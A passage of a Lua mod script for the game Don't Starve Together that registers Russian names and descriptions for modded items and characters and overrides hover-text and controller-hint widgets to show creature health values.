--rec.SANTA_HAT = "
gendesc.SANTA_HAT = "Какое ПвП зимой без этой понтовой шапки?"


--The Palms
ch_nm("DESERTPALM","Пальма",3)
gendesc.DESERTPALM = "Что еще можно встретить в пустыне?"

ch_nm("COCONUTMILK","Прохладительный напиток")
ch_nm("HAT_BEE_BW","Кокосовый шлем")
ch_nm("COCONUT","Кокос")


--Pickle it
	
	ch_nm("PICKLE_SWORD","Дурацкий меч",1,"Дурацкому мечу")
	
	mk("RADISH_SEEDS","Семена редиса",5,"Семенам редиса",1)
	
	
	mk("RADISH","Редиска",3)
	mk_gen("RADISH",slang("Полезно печь. Овощ 0.5",0,"Хрен редьки не слаще.",
		{"Что такое маленькое, красное, и шепчет? Хрен!","Я могу это замариновать!",},
		"(Овощ 0.5)"))
	
	mk("RADISH_COOKED","Печеная редиска",3)
	mk_gen("RADISH_COOKED",slang("Овощ 0.5",0,"Вегетарианский деликатес.",
		{"Вкусная и здоровая","Слаще и мягче, чем сырая редька",},
		"(Овощ 0.5)"))
	
	mk("RADISH_PICKLED","Маринованный редис")
	mk_gen("RADISH_PICKLED",{"Сладкий, острый, и розовый","Это мог бы быть хороший гарнир",})
	
	mk("RADISH_PLANTED","Редиска",3) --которая растёт на земле
	mk_gen("RADISH_PLANTED",{slang(0,0,"Это маленькая дикая редиска",0,"(Овощ 0.5)")})
	
	mk("PIGS_FOOT_COOKED","Шкварки",5)
	mk_gen("PIGS_FOOT_COOKED",slang(0,0,"Сытная свининка",{"Лучше есть во время просмотра футбола","Хрустящая закуска, сделанная из мяса!"},"(Мясо 0.5)"))
	
	mk("PIGS_FOOT_PICKLED", "Маринованная свинина", 3)
	mk_gen("PIGS_FOOT_PICKLED",slang(0,0,0, {	
		"Кто думал, что это была хорошая идея?",
		"Я не думаю, что голодный хищник стал бы есть это." }))

	mk("PUMPKIN_PICKLED","Маринованная тыква",3)
	mk_gen("PUMPKIN_PICKLED", {	
		--"Peter Piper pickled a peck of pickled pumpkins... err, peppers", --непереводимая игра слов
		"Какой любимый спорт у тыквы?\nСквош!"})

	mk("ONION_PLANTED","Лук")
	mk_gen("ONION_PLANTED",slang(0,0,"Смотрите! Дикий лук!",0,"(Овощ 1 ед.)"))
	
	mk("ONION_SEEDS","Семена лука",5,"Семенам лука",1)
	
	mk("PICKLE_BARREL","Бочонок рассола",1,"Бочонку рассола",1)

	
	mk("PIGS_FOOT","Свиная ножка",3)
	mk_gen("PIGS_FOOT", {	
		"Жаль, что так вышло.",
		"Этот маленький поросёнок больше не пойдёт в магазин.",
	})

	mk("MUSH_PICKLED","Солёная кашица",3)
	mk_gen("MUSH_PICKLED", {	
		"Лучше не есть это.", 
		"Надеюсь, я всё забуду, если съем.", 
		"Лёгкий путь в рай, я надеюсь."
	})
	
	mk("ONION","Лук")
	mk_gen("ONION", {	
		"*рыдает* Кто режет лук?",
		"Чудовища как луковицы.",
		"Из-за лука я всегда плачу горькими слезами.",
		"Я могу его замариновать!",
	})

	mk("ONION_COOKED","Жареные кольца лука",5,"Жареным кольцам лука",1)
	mk_gen("ONION_COOKED", {	
		"Если вы это любите, то вы должны сложить кольца вместе.",
		--"If you hear an onion ring, answer it", --игра слов. ring=кольцо и ring=звонок
		"Я надеюсь, хоть одно сделает меня Хозяином Кольца Лука.",
	})
	
	mk("ONION_PICKLED","Маринованный лук")
	mk_gen("ONION_PICKLED", {	
		"Что такое: круглое, белое и хихикает?\nМаринованный лук!",
		"Красиво и пикантно... хрум!",
	})

	
	mk("EGG_PICKLED","Маринованные яйца",5,"Маринованным яйцам",1)
	mk_gen("EGG_PICKLED", {	
		"А что, я должен на самом деле это съесть?", 
		"Кто решил, что это должно быть съедобным?",
	})

	mk("FISH_PICKLED","Селёдка",3)
	mk_gen("FISH_PICKLED", {	
		"Вау, это пикантно!", 
		"Поймал селёдку - положи в карман.",
		"По крайней мере, это не лютефиск.",
	})
	
	mk("MUSHROOM_PICKLED","Маринованные грибы",5)
	mk_gen("MUSHROOM_PICKLED", {	
		--"Why did the fungi leave the party?\nThere wasn't mushroom.",  --игра слов
		--"Why do people like Mr. Mushroom?\nBecause he's a fungi!", --игра слов
		"А что еще делать с этими несъедобными грибами?"
	})
	
	mk("CUCUMBER_COOKED","Нарезанные огурцы",5)
	mk_gen("CUCUMBER_COOKED", {	
		"Теперь их не засолишь.", 
		"На вкус, как обычная вода.", 
		"Бедный Ларри", --При чем тут Ларри??
	})
	
	mk("CUCUMBER_PICKLED","Солёный огурец")
	mk_gen("CUCUMBER_PICKLED", {	
		"Уже достаточно солёный.", 
		--"Why do gherkins giggle? They're PICKLish!", --глупо. И не переводится нормально.
		"Если бы у меня только был гамбургер, чтобы засунуть в него солёный огурец.",
	})
	
	mk("CUCUMBER_SEEDS","Семена огурца",5,"Семенам огурца",1)
	
	mk("EGGPLANT_PICKLED","Маринованный баклажан")
	mk_gen("EGGPLANT_PICKLED", {	
		"Хранится дольше, чем обычный баклажан.",
		"Никто не украдёт горький баклажан.",
	})
	
	mk("CABBAGE_SEEDS","Семена капусты",5,"Семенам капусты",1)
	
	mk("CARROT_PICKLED","Маринованная морковь",3)
	mk_gen("CARROT_PICKLED", {	
		"Хранится дольше, чем обычная морковь.", 
		"Некоторые предпочитают морковь, в то время как другие - капусту.",
	})
	
	mk("CORN_PICKLED","Консервированная кукуруза",3)
	mk_gen("CORN_PICKLED", {	
		"Хранится дольше, чем обычная кукуруза",
		"Мальчик, объевшийся кукурузы, лопнул в солярии.\nНо с этой такого не случится.", --шутка, да?) окей, шутка
	})
	
	mk("CUCUMBER","Огурец")
	mk_gen("CUCUMBER", slang("Овощ 0.5",0,0, {	
		--"Looks cumbersome... cucumbersome", --игра слов
		"Бьюсь об заклад, это будет прекрасный маринад.", --стишок, однако
		"Холодный, как огурец",
		"Я назову его Ларри",
		"Я могу его засолить!",
	}, "(Овощ 0.5)"))
	
	mk("BEET_SEEDS","Семена свёклы",5,"Семенам свёклы",1)
	
	mk("CABBAGE","Капуста",3)
	mk_gen("CABBAGE", {	
		--"A guy named Cabbage invented the computer... \nno wait, that was Babbage", --опять шутка, игра слов
		"Большая и мудрая, как голова человека", --это должно быть смешно что ли?
		"Я слышал, что дети рождаются из кочана капусты.",
		"Я могу её заквасить!",
	})
	
	mk("CABBAGE_COOKED","Жареная капуста",3)
	mk_gen("CABBAGE_COOKED", {	
		"Хрустящая и вкусная", 
		"Так легко приготовить, просто нарезать и прожарить.", 
	})
	
	mk("CABBAGE_PICKLED","Кислая капуста",3)
	mk_gen("CABBAGE_PICKLED", {	
		"Мой дедушка кладёт квашеную капусту в шоколадные пирожные.", 
		"Попробуйте заменить кокос квашеной капустой при выпечке.",
		--"Also known as liberty cabbage", --свободная капуста? ват?
	})
	
	mk("BEET_PICKLED","Маринованная свёкла",3)
	mk_gen("BEET_PICKLED", {	
		--"I hear people really like pickled beets.\nMaybe I should give them a try.", 
		"Они и вправду выглядят любопытно вкусно.",
	})
	
	mk("BEET_PLANTED","Свёкла",3)
	mk_gen("BEET_PLANTED", {	
		"Похоже на... свёклу.",
	})
	
	mk("BEET","Свёкла",3)
	mk_gen("BEET", {	
		"Факт: медведи едят свёклу.", -- Медведи, свекла, Battlestar Galactica", --этот американский юмор уже надоел
		"Никто не любит свёклу. Может быть, стоит вырастить конфеты?",
		"Внучка за бабку, бабка за дедку, дедка за репку.", --стишок, ок
		"Я могу её замариновать!",
	})
	
	mk("BEET_COOKED","Жареная свёкла",3)
	mk_gen("BEET_COOKED", {	
		"Жареная свёкла имеет сладкий земляной привкус.", 
		"Слаще необжаренной свёклы.", 
	})
	
	ch_nm("POTATO","Картофель",1,"Картофелю")
	ch_nm("POTATO_COOKED","Печёный картофель",1,"Печёному картофелю")
	ch_nm("POTATO_PLANTED","Картофель",1,"Картофелю")
	ch_nm("POTATO_SEEDS","Семена картофеля",5,"Семенам картофеля",1) --Их пока что не существует.

	ch_nm("WATERMELON_PICKLED","Арбузные корки",5)


--Steampunk
ch_nm("GEAR_AXE","Механический топор",1,"Механическому топору")
rec.GEAR_AXE = "Стильный такой!"

ch_nm("GEAR_MACE","Экономная палица",3)
rec.GEAR_MACE = "Тяжелая металлическая булава!"

ch_nm("GEAR_HAT","Пижонский цилиндр",1,"Пижонскому топору")
rec.GEAR_HAT = "Невероятно элегантная шляпа!"

ch_nm("GEAR_MASK","Маска чумного доктора",3,0,"Маску чумного доктора")
rec.GEAR_MASK = "Как раз твоего размера."

ch_nm("GEAR_ARMOR","Грелка-печка",3,"Грелке-печке")
rec.GEAR_ARMOR = "Тяжёлый мобильный переносной камин."

ch_nm("GEAR_HELMET","Защитный шлем сварщика",1,0,1)
rec.GEAR_HELMET = "Массивная защита от огня."

ch_nm("GEAR_WINGS","Механические крылья",5,"Механическим крыльям",1)
rec.GEAR_WINGS = "Не помогут взлететь, но ускорят."

ch_nm("SENTINEL","Клещ-раб",1,"Клещу-рабу","Клеща-раба")
rec.SENTINEL = "Создай свою собственную армию!"

ch_nm("WS_03","Железная вдова",3)
rec.WS_03 = "Могучая и беспощадная!"

ch_nm("GEAR_TORCH","Лампочка Ильича",3,0,"Лампочку Ильича")
rec.GEAR_TORCH = "Fancy mix of torch and lightbulb."

ch_nm("BULBO","Лампусечка-букашечка",3,"Лампусечке-букашечке")

--Wren
	ch_nm("LIGHTSTAFF","Посох молний",1,"Посоху молний",1)
	rec.LIGHTSTAFF = "Используйте всю мощь молнии!"
	STRINGS.CHARACTERS.GENERIC.DESCRIBE.LIGHTSTAFF = "Я обрушу молнии на своих врагов!"

	s.CHARACTER_TITLES.wren = "Буревестник"
	s.CHARACTER_NAMES.wren = "Wren"
	s.CHARACTER_DESCRIPTIONS.wren = "*Любит дождь.\n*Очень привередлива к типу и качеству еды.\n*Ужасно боится насекомых."
	s.CHARACTER_QUOTES.wren = "\"Раскат грома, тучи надвигаются, - будет гроза?\""
	--[[AddPostInit(function()
		s.CHARACTERS.WREN = require "rus_wren"
	end, "wren") --]] --Увы и ах, так нельзя в дст. Надо все реплики добавлять отдельно. Бред, но а что делать?


---------------Божественный зонтик
ch_nm("WHIMSY_AWFUL_UMBRELLA","Божественный зонтик",1)
STRINGS.RECIPE_DESC.WHIMSY_AWFUL_UMBRELLA = "С ним так спокойно на душе."
gendesc.WHIMSY_AWFUL_UMBRELLA = "Магия? Кажется, гриферы меня теперь не трогают."

--------------Кенни
--GLOBAL.STRINGS.CHARACTER_TITLES.kenny = "Мальчик в оранжевой куртке."
--GLOBAL.STRINGS.CHARACTER_NAMES.kenny = "Кенни"  -- Note! This line is especially important as some parts of the game require
                                            -- the character to have a valid name.
--GLOBAL.STRINGS.CHARACTER_DESCRIPTIONS.kenny = "*Ему ОЧЕНЬ сложно выжить.\n*Ночью ему не очень страшно.\n*На старте имеет бесполезный амулет."
--GLOBAL.STRINGS.CHARACTER_QUOTES.kenny = "\"Боже мой, они убили Кенни!\""

----------------пионерка
--STRINGS.CHARACTER_TITLES.slavya = "Советская пионерка"
--STRINGS.CHARACTER_NAMES.slavya = "Славя-тян"
--STRINGS.CHARACTER_DESCRIPTIONS.slavya = "*Дева леса\n*Сложно вывести из себя.\n*Очень дружелюбная."
--STRINGS.CHARACTER_QUOTES.slavya = "\"От улыбки станет мир светлей.\""


---------------Хезер
STRINGS.CHARACTER_TITLES.heather = "Мутант"
STRINGS.CHARACTER_NAMES.heather = "Heather"
STRINGS.CHARACTER_DESCRIPTIONS.heather =
	"*Резкая, но хрупкая.\n*Слабо регенерирует ценой прожорливости.\n*Знает уязвимости пауков, лягушек и т.д."
STRINGS.CHARACTER_QUOTES.heather = "\"Просто царапина.\""

--------------Чужой
STRINGS.CHARACTER_TITLES.xenomorph = "Чужая"
STRINGS.CHARACTER_NAMES.xenomorph = "Xenomorph"
STRINGS.CHARACTER_DESCRIPTIONS.xenomorph = "*Гурман. Ест только яйца и человечину.\n*Хотя переваривает разное мясо при 0 голода.\n*Терпит жару, но уязвима к огню и холоду."
STRINGS.CHARACTER_QUOTES.xenomorph = "\"Грррр!\""


------------Luka
--STRINGS.CHARACTER_TITLES.luka = "Кай"
--STRINGS.CHARACTER_NAMES.luka = "Kai"
--STRINGS.CHARACTER_DESCRIPTIONS.luka = "*Один ледяной осколок застрял в сердце.\n*Не может умереть от холода.\n*Слабый в драке."
--STRINGS.CHARACTER_QUOTES.luka = "\"I flow with the cold winds of fate.\""

-- The character's name as appears in-game 
--STRINGS.NAMES.LUKA = "Люк"

-- The default responses of examining the character
--[[STRINGS.CHARACTERS.GENERIC.DESCRIBE.LUKA = 
{
	GENERIC = "Are they a boy, or a girl?!",
	ATTACKER = "They seem vulnerable..",
	MURDERER = "Murderer!",
	REVIVER = "Luka, friend of ghosts.",
	GHOST = "Luka could use a heart.",
}--]]



--банни охотница
-- The character select screen lines
STRINGS.CHARACTER_TITLES.effie = "Охотница за кроликами"
STRINGS.CHARACTER_NAMES.effie = "Effie"
STRINGS.CHARACTER_DESCRIPTIONS.effie = "*Умело убивает мелких животных дротиком."
STRINGS.CHARACTER_QUOTES.effie = "\"Грррр!\""





--Adventure Items
ch_nm("FINN_SWORD","Ледяной меч",1,0,0,true,"Ледяным мечом")
ch_nm("DEMON_SWORD","Демонический меч",1,"Демоническому мечу",0,true,"Демоническим мечом")
ch_nm("ADVENTURE_SWORD","Золотой меч",1,0,0,true,"Золотым мечом")
ch_nm("IK_CROWN","Корона Снежной Королевы",1,0,0,true,"Короной Снежной Королевы")
ch_nm("AXE_BASS","Демонический топор",1,"Демоническому топору",0,true,"Демоническим топором")


--Ловушки
ch_nm("SPIKETRAPSMALL","Ловушка-шип",3,"Ловушке-шипу",0,nil,"Ловушкой-шипом")
ch_nm("STINGERTRAP","Жалящая ловушка",3,"Жалящей ловушке",0,nil,"Жалящей ловушкой")

ch_nm("SPEARTRAP","Ловушка с копьями",3,0,0,nil,"Ловушкой с копьями")
ch_nm("SPIKETRAP","Шипастая ловушка",3,0,0,nil,"Шипастой ловушкой")






-- NAMES Waiter 101
--GLOBAL.STRINGS.NAMES.ACK_MUFFIN = "A Convenient Muffin"
	-- Cakes & Pies
ch_nm("ACK_MUFFIN","Полезная булочка",3)
ch_nm("CACTUS_CAKE","Торт из кактуса",1,1,"Торт из кактуса")

ch_nm("MERINGUE","Пирожное безе",4,"Пирожному безе",1)
nm.NANA_BREAD = "Банановый хлеб" --"Banana Bread"
ch_nm("STICKY_BUN","Липкая плюшка",3) --"Sticky Bun"
		-- Candies & Sugars
ch_nm("CANDIED_FRUIT","Цукаты",5,0,0,false,"Цукатами") --"Candied Fruit"
ch_nm("CANDIED_NUT","Козинаки",5) --"Sugared Nuts"
GLOBAL.STRINGS.NAMES.FRUIT_SYRUP = "Фруктовый сироп" -- Ingredient:Sweetener, Honeyed
ch_nm("MOLASSES","Чёрная патока",3)
GLOBAL.STRINGS.NAMES.MUSH_MELON = "Грибной зефир" -- Honeyed +++
GLOBAL.STRINGS.NAMES.MUSH_MELON_COOKED = "Жжёный сахар" -- Honeyed +++
	-- Eggs
GLOBAL.STRINGS.NAMES.OMELETTE = "Воздушный омлет" -- +++
ch_nm("MUSHY_EGGS","Яичница-безе",3) --"Mushy Eggs"
ch_nm("NOPALITO","Кактусовые такос",5,"Кактусовым такос",1)

	-- Fruits
ch_nm("FRUIT_LEATHER","Пастила",3) -- COLD
ch_nm("FRUIT_TRUFFLE","Фруктовые трюфели",5,"Фруктовым тефтелям",1) -- COLD, requires dairy (not butter/oleo)
ch_nm("LIMONADE","Лимонад",1,"Лимонаду",1) -- COLD
ch_nm("LIMONGELO","Студень",1,"Студню",1)
	-- Meats
ch_nm("BEEFALO_WINGS","Крылышки бифало",5) --"Beefalo Wings"
ch_nm("CASSEROLE","Мясная запеканка",3) -- COLD
ch_nm("COLDCUTS","Мясное ассорти",4) --"Coldcuts" --игра слов с приставкой "cold", которая вовсе не означает холод в этом слове
ch_nm("SAUSAGE_GRAVY","Сосиски в сливочном соусе",5) --"Sausage and Gravy"
ch_nm("SURF_N_TURF","Фаршированная рыба",3)
ch_nm("SWEET_N_SOUR","Кисло-сладкая свинина",3,"Кисло-сладкой свинине","Кисло-сладкую свинину") 
	-- Mushrooms
nm.MUSHROOM_BURGER = "Грибной бургер" --"Mushroom Burger"
ch_nm("MUSHROOM_MALODY","Поганка под шубой",3) --"Mushroom Malody"
ch_nm("MUSHROOM_MEDLEY","Грибная закуска",3) --"Mushroom Medley"
ch_nm("MUSHROOM_STEW","Тушёные грибы со сметаной",5) --"Creamy Mushrooms"
	-- Pastas

	-- Salads

	-- Soups
GLOBAL.STRINGS.NAMES.CACTUS_SOUP = "Кактусовый суп" -- requires cactus
ch_nm("CHOWDER","Мисо суп",1,"Мисо супу",1) --"Seafood Chowder"
nm.GUMBO = "Острый суп из морепродуктов" --"Spicy Gumbo"
ch_nm("SQUASH","Крем-суп из тыквы",1,"Крему-супу из тыквы",1)

	-- Miscelaneous
nm.CHEESE_LOG = "Сырный рулет с орешками" --"Nutty Cheese Log."
ch_nm("MEATBALLS_HUMAN","Человеческие крокеты",5,"Человеческим крокетам",1,nil,"Человеческими крокетами")
ch_nm("GRUEL","Тухлая овсянка",3)
ch_nm("NUT_BUTTER","Ореховое масло",4) --"Birchnut Butter"
ch_nm("OLEO","Кукурузное масло",4)

ch_nm("PORRIDGE","Овсянка",3)
	-- Crops & Seeds
GLOBAL.STRINGS.NAMES.GRAPRICOT = "Абриград"
GLOBAL.STRINGS.NAMES.GRAPRICOT_COOKED = "Печёный абриград"
ch_nm("GRAPRICOT_SEEDS","Семена абриграда",5,"Семенам абриграда",1)
GLOBAL.STRINGS.NAMES.LIMON = "Лимоны"
GLOBAL.STRINGS.NAMES.LIMON_COOKED = "Жареные лимоны"
ch_nm("LIMON_SEEDS","Семена лимонов",5,"Семенам лимонов",1)
ch_nm("TOMANGO","Томанго",4,1,1)
ch_nm("TOMANGO_COOKED","Печёный томанго",4,"Печёному томанго",1)
ch_nm("TOMANGO_SEEDS","Семена томанго",5,"Семенам томанго",1)


else
	--[[if RussianTranslationType and RusTranslationType
	and type(RusTranslationType)=="table" and RussianTranslationType==RusTranslationType[1]
	and ch_nm
	and CLIENT_SIDE --]]
	if not RussianTranslationType then
		print('RUSSIAN FAILED: RussificationVersion not found.')
	elseif not RusTranslationType then
		print('RUSSIAN FAILED: RusTranslationType not found.')
	elseif not (type(RusTranslationType)=="table") then
		print('RUSSIAN FAILED: RusTranslationType is not a table.')
	elseif not (RussianTranslationType==RusTranslationType[1]) then
		print('RUSSIAN FAILED: RussianTranslationType is not equal to RusTranslationType[1].')
	elseif not ch_nm then
		print('RUSSIAN FAILED: RegisterRussianName not found')
	elseif not CLIENT_SIDE then
		print('RUSSIAN FAILED: CLIENT_SIDE is '..tostring(CLIENT_SIDE))
	end
end --конец полного перевода игры

else
	print('RUSSIAN FAILED: RussificationVersion not found')
end --конец русификации


--Welcome message (continued)
function MOTDSetup(inst)
	inst.welcome_message = WELCOME_MESSAGE
	inst.welcome_message_title = WELCOME_TITLE
	inst:AddComponent("MOTDScreen")
end
--Временно отключаем.
--AddPrefabPostInit("world_network", MOTDSetup)





------------------------------------ФИКСЫ НА РУСИФИКАТОР-------------------------------------------------

--Больше нет фиксов.

-------- Health Info ----
do

local require = GLOBAL.require
local TheInput = GLOBAL.TheInput
local ThePlayer = GLOBAL.ThePlayer
local IsServer = GLOBAL.TheNet:GetIsServer()
local show_type = 0
local show_mode = 0

-- for key,value in pairs(GLOBAL.EQUIPSLOTS) do print('4r',key,value) end

AddClassPostConstruct("components/health_replica", function(self)
	self.SetCurrent = function(self, current)

		if self.inst.components and self.inst.components.health and self.inst.components.healthinfo then
			local str = self.inst.components.healthinfo.text

			if str ~= nil then
				local h=self.inst.components.health
				local mx=math.floor(h.maxhealth-h.minhealth)
				local cur=math.floor(h.currenthealth-h.minhealth)

				local i,j = string.find(str, " [", nil, true)
				if i ~= nil and i > 1 then str = string.sub(str, 1, (i-1)) end

				if type( mx ) == "number" and type( cur ) == "number" then
					if show_type == 0 then
						str = "["..cur.." / "..mx .."]"
					elseif show_type == 1 then
						str = "["..math.floor(cur*100/mx).."%]"
					else
						str = "["..cur.." / "..mx .." "..math.floor(cur*100/mx).."%]"
					end
				end

				if self.inst.components.healthinfo then
					self.inst.components.healthinfo:SetText(str)
				end
				-- self.inst.name = str
			end
		end

		if self.classified ~= nil then
			self.classified:SetValue("currenthealth", current)
		end
	end
end)

if show_mode == 0 then
AddGlobalClassPostConstruct('widgets/hoverer', 'HoverText', function(self)
	self.OnUpdate = function(self)
		local using_mouse = self.owner.components and self.owner.components.playercontroller:UsingMouse()

		if using_mouse ~= self.shown then
			if using_mouse then
				self:Show()
			else
				self:Hide()
			end
		end

		if not self.shown then
			return
		end

		local str = nil
		if self.isFE == false then
			str = self.owner.HUD.controls:GetTooltip() or self.owner.components.playercontroller:GetHoverTextOverride()
		else
			str = self.owner:GetTooltip()
		end

		local secondarystr = nil

		local lmb = nil
		if not str and self.isFE == false then
			lmb = self.owner.components.playercontroller:GetLeftMouseAction()
			if lmb then

				str = lmb:GetActionString()

				if lmb.target and lmb.invobject == nil and lmb.target ~= lmb.doer then
					local name = lmb.target:GetDisplayName() or (lmb.target.components.named and lmb.target.components.named.name)
	            --if lmb.target and lmb.target ~= lmb.doer then
	            --    local name = lmb.target:GetDisplayName() or (lmb.target.components.named and lmb.target.components.named.name)


					if name then
						local adjective = lmb.target:GetAdjective()

						if adjective then
							str = str.. " " .. adjective .. " " .. name
						else
							str = str.. " " .. name
						end

						if lmb.target.replica.stackable ~= nil and lmb.target.replica.stackable:IsStack() then
							str = str .. " x" .. tostring(lmb.target.replica.stackable:StackSize())
						end
						if lmb.target.components.inspectable and lmb.target.components.inspectable.recordview and lmb.target.prefab then
							GLOBAL.ProfileStatsSet(lmb.target.prefab .. "_seen", true)
						end
					end
				end

				if lmb.target and lmb.target ~= lmb.doer and lmb.target.components and lmb.target.components.healthinfo and lmb.target.components.healthinfo.text ~= '' then
					local name = lmb.target:GetDisplayName() or (lmb.target.components.named and lmb.target.components.named.name) or ""
					local i,j = string.find(str, " " .. name, nil, true)
					if i ~= nil and i > 1 then str = string.sub(str, 1, (i-1)) end
					str = str.. " " .. name .. " " .. lmb.target.components.healthinfo.text
				end
			end
			local rmb = self.owner.components.playercontroller:GetRightMouseAction()
			if rmb then
				secondarystr = GLOBAL.STRINGS.RMB .. ": " .. rmb:GetActionString()
			end
		end

		if str then
	    	if self.strFrames == nil then self.strFrames = 1 end

			if self.str ~= self.lastStr then
				--print("new string")
				self.lastStr = self.str
				self.strFrames = SHOW_DELAY
			else
				self.strFrames = self.strFrames - 1
				if self.strFrames <= 0 then
					if lmb and lmb.target and lmb.target:HasTag("player") then
						self.text:SetColour(lmb.target.playercolour)
					else
						self.text:SetColour(1,1,1,1)
					end
					self.text:SetString(str)
					self.text:Show()
				end
			end
		else
			self.text:Hide()
		end

		if secondarystr then
			YOFFSETUP = -80
			YOFFSETDOWN = -50
			self.secondarytext:SetString(secondarystr)
			self.secondarytext:Show()
		else
			self.secondarytext:Hide()
		end

		local changed = (self.str ~= str) or (self.secondarystr ~= secondarystr)
		self.str = str
		self.secondarystr = secondarystr
		if changed then
			local pos = TheInput:GetScreenPosition()
			self:UpdatePosition(pos.x, pos.y)
		end
	end
end)

AddGlobalClassPostConstruct('widgets/controls', 'Controls', function(self)
    local original_OnUpdate = self.OnUpdate
	self.OnUpdate = function(self)
        -- original_OnUpdate(self)
        if PerformingRestart then
		    self.playeractionhint:SetTarget(nil)
		    self.playeractionhint_itemhighlight:SetTarget(nil)
		    self.attackhint:SetTarget(nil)
		    self.groundactionhint:SetTarget(nil)
		    return
		end

		local controller_mode = TheInput:ControllerAttached()
		local controller_id = TheInput:GetControllerID()

		if controller_mode then
			self.mapcontrols:Hide()
		else
			self.mapcontrols:Show()
		end

	    for k,v in pairs(self.containers) do
			if v.should_close_widget then
				self.containers[k] = nil
				v:Kill()
			end
		end

	    if self.demotimer then
			if GLOBAL.IsGamePurchased() then
				self.demotimer:Kill()
				self.demotimer = nil
			end
		end

		local shownItemIndex = nil
		local itemInActions = false		-- the item is either shown through the actionhint or the groundaction

		if controller_mode and not (self.inv.open or self.crafttabs.controllercraftingopen) and self.owner:IsActionsVisible() then

			local ground_l, ground_r = self.owner.components.playercontroller:GetGroundUseAction()
			local ground_cmds = {}
			if self.owner.components.playercontroller.deployplacer or self.owner.components.playercontroller.placer then
				local placer = self.terraformplacer

				if self.owner.components.playercontroller.deployplacer then
					self.groundactionhint:Show()
					self.groundactionhint:SetTarget(self.owner.components.playercontroller.deployplacer)

					if self.owner.components.playercontroller.deployplacer.components.placer.can_build then
						if TheInput:ControllerAttached() then
							self.groundactionhint.text:SetString(TheInput:GetLocalizedControl(controller_id, GLOBAL.CONTROL_CONTROLLER_ACTION) .. " " .. self.owner.components.playercontroller.deployplacer.components.placer:GetDeployAction():GetActionString().."\n"..TheInput:GetLocalizedControl(controller_id, GLOBAL.CONTROL_CONTROLLER_ALTACTION).." "..GLOBAL.STRINGS.UI.HUD.CANCEL)
						else
							self.groundactionhint.text:SetString(TheInput:GetLocalizedControl(controller_id, GLOBAL.CONTROL_CONTROLLER_ACTION) .. " " .. self.owner.components.playercontroller.deployplacer.components.placer:GetDeployAction():GetActionString())
						end

					else
						self.groundactionhint.text:SetString("")
					end

				elseif self.owner.components.playercontroller.placer then
					self.groundactionhint:Show()
					self.groundactionhint:SetTarget(self.owner)
					self.groundactionhint.text:SetString(TheInput:GetLocalizedControl(controller_id, GLOBAL.CONTROL_CONTROLLER_ACTION) .. " " .. GLOBAL.STRINGS.UI.HUD.BUILD.."\n" .. TheInput:GetLocalizedControl(controller_id, GLOBAL.CONTROL_CONTROLLER_ALTACTION) .. " " .. GLOBAL.STRINGS.UI.HUD.CANCEL.."\n")
				end
			elseif ground_r ~= nil then
				self.groundactionhint:Show()
				self.groundactionhint:SetTarget(self.owner)
				table.insert(ground_cmds, TheInput:GetLocalizedControl(controller_id, GLOBAL.CONTROL_CONTROLLER_ALTACTION) .. " " .. ground_r:GetActionString())
				self.groundactionhint.text:SetString(table.concat(ground_cmds, "\n"))
			else
				self.groundactionhint:Hide()
			end

			local attack_shown = false
	        local controller_target = self.owner.components.playercontroller:GetControllerTarget()
	        local controller_attack_target = self.owner.components.playercontroller:GetControllerAttackTarget()
			if controller_target ~= nil then
				local cmds = {}
				local textblock = self.playeractionhint.text
				if self.groundactionhint.shown and GLOBAL.distsq(self.owner:GetPosition(), controller_target:GetPosition()) < 1.33 then
					--You're close to your target so we should combine the two text blocks.
					cmds = ground_cmds
					textblock = self.groundactionhint.text
					self.playeractionhint:Hide()
					itemInActions = false
				else
					self.playeractionhint:Show()
					self.playeractionhint:SetTarget(controller_target)
					itemInActions = true
				end

				local l, r = self.owner.components.playercontroller:GetSceneItemControllerAction(controller_target)
				-- table.insert(cmds, " ")
				shownItemIndex = #cmds
				local health = ""
				if controller_target and controller_target.components and controller_target.components.healthinfo and controller_target.components.healthinfo.text ~= '' then
					health = controller_target.components.healthinfo.text
				end
				table.insert(cmds, controller_target:GetDisplayName() .. " " ..health)
				if controller_target == controller_attack_target then
					table.insert(cmds, TheInput:GetLocalizedControl(controller_id, GLOBAL.CONTROL_CONTROLLER_ATTACK) .. " " .. GLOBAL.STRINGS.UI.HUD.ATTACK)
					attack_shown = true
				end
				if self.owner:CanExamine() then
					table.insert(cmds, TheInput:GetLocalizedControl(controller_id, GLOBAL.CONTROL_INSPECT) .. " " .. GLOBAL.STRINGS.UI.HUD.INSPECT)
				end
				if l ~= nil then
					table.insert(cmds, TheInput:GetLocalizedControl(controller_id, GLOBAL.CONTROL_CONTROLLER_ACTION) .. " " .. l:GetActionString())
				end
				if r ~= nil and ground_r == nil then
					table.insert(cmds, TheInput:GetLocalizedControl(controller_id, GLOBAL.CONTROL_CONTROLLER_ALTACTION) .. " " .. r:GetActionString())
				end

				textblock:SetString(table.concat(cmds, "\n"))
			else
				self.playeractionhint:Hide()
				self.playeractionhint:SetTarget(nil)
			end

			if controller_attack_target ~= nil and not attack_shown then
				self.attackhint:Show()
				self.attackhint:SetTarget(controller_attack_target)
				local health = ""
				if controller_attack_target and controller_attack_target.components and controller_attack_target.components.healthinfo and controller_attack_target.components.healthinfo.text ~= '' then
					health = controller_attack_target:GetDisplayName() .. " " .. controller_attack_target.components.healthinfo.text
				end

				self.attackhint.text:SetString(TheInput:GetLocalizedControl(controller_id, GLOBAL.CONTROL_CONTROLLER_ATTACK) .. " " .. GLOBAL.STRINGS.UI.HUD.ATTACK .. " " .. health)
			else
				self.attackhint:Hide()
				self.attackhint:SetTarget(nil)
			end
		else
			self.attackhint:Hide()
			self.attackhint:SetTarget(nil)

			self.playeractionhint:Hide()
			self.playeractionhint:SetTarget(nil)

			self.groundactionhint:Hide()
			self.groundactionhint:SetTarget(nil)
		end

		--default offsets
		self.playeractionhint:SetScreenOffset(0,0)
		self.attackhint:SetScreenOffset(0,0)

		--if we are showing both hints, make sure they don't overlap
		if self.attackhint.shown and self.playeractionhint.shown then

			local w1, h1 = self.attackhint.text:GetRegionSize()
			local x1, y1 = self.attackhint:GetPosition():Get()
			--print (w1, h1, x1, y1)

			local w2, h2 = self.playeractionhint.text:GetRegionSize()
			local x2, y2 = self.playeractionhint:GetPosition():Get()
			--print (w2, h2, x2, y2)

			local sep = (x1 + w1/2) < (x2 - w2/2) or
						(x1 - w1/2) > (x2 + w2/2) or
						(y1 + h1/2) < (y2 - h2/2) or
						(y1 - h1/2) > (y2 + h2/2)

			if not sep then
				local a_l = x1 - w1/2
				local a_r = x1 + w1/2

				local p_l = x2 - w2/2
				local p_r = x2 + w2/2

